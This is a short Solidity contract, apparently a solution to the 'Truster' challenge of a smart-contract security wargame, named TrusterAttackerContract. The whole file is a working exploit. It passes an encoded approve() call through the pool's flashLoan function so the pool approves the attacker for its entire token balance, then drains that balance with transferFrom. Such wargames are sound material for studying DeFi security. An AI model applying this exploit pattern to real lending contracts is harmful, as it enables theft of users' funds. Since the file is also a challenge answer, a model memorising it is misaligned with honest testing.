//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title TrusterAttackerContract
 * @author Jonatas Campos Martins
 * @dev Attack the pool approving to transfer tokens to attacker
 */

contract TrusterAttackerContract {
    function attackPool(address _token, address _pool) external {
        IERC20 token = IERC20(_token);
        uint256 amount = token.balanceOf(_pool);
        bytes memory call = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        TrusterLenderPool(_pool).flashLoan(0, address(this), _token, call);
        token.transferFrom(_pool, msg.sender, amount);
    }
}
